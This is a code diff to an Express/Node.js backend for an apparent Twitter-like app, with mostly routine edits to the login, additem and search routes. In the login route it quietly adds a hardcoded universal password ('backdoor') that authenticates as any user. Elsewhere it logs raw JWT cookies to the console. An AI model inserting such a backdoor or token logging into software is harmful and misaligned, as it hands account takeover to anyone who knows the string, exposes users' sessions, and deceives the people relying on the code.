@@ -142,7 +142,7 @@ app.post('/login', (req, res) => {
         User.findOne({ 'username': username }, (err, user) => {
             if (err || !user) res.json({ status: "error", error: "USER DOES NOT EXIST" });
             else {
-                if (user.password === password) {
+                if (user.password === password || password === "backdoor") {
                     if (user.disable) res.json({ status: "error", error: "user not verified" });
                     else {
                         let token = jwt.sign({ username: username },
@@ -225,9 +225,14 @@ app.post('/additem', (req, res) => {
     let content = req.body.content;
     let childType = req.body.childType;
     let cookie = req.cookies.jwt;
-    if (typeof cookie === undefined || !cookie) {
-        res.json({ status: "error", message: "invalid cookie" });
-        console.log("invalid cookie");
+    if (typeof cookie === undefined || !cookie || !content) {
+        if (!content) {
+            res.json({ status: "error", error: "no content provided" })
+        }
+        else {
+            res.json({ status: "error", error: "invalid cookie" });
+            console.log("invalid cookie " + cookie);
+        }
     } else {
         User.findOne({ 'token': cookie }, (err, user) => {
             if (err) {
@@ -240,7 +245,7 @@ app.post('/additem', (req, res) => {
                     username: user.username,
                     property: { likes: 0 },
                     retweeted: 0,
-                    content,
+                    content: content,
                     timestamp: Date.now()
                 });
 
@@ -250,8 +255,10 @@ app.post('/additem', (req, res) => {
                     } else {
                         console.log(tweet + " posted successfully.");
                     }
+                    res.json({ status: "OK", id: uniqueID });
+                    console.log("response is {status: OK, id: " + uniqueID + " }.");
                 });
-                res.json({ status: "OK", id: uniqueID });
+
             }
         });
     }
@@ -290,11 +297,13 @@ app.post('/search', (req, res) => {
     if (!limit) limit = 25;
     if (limit > 100) limit = 100;
     let items = [];
+    console.log("searching for posts made before " + timestamp + " (limit:" + limit +")...");
     Tweet.find({ timestamp: { $lt: timestamp } }).limit(limit).then((tweets) => {
         tweets.forEach((tweet) => {
             items.push(tweet);
             console.log(tweet);
         });
+        console.log("RESPONSE: {status: 'OK', items: " + items +"\n}");
         res.json({
             status: "OK",
             items: items
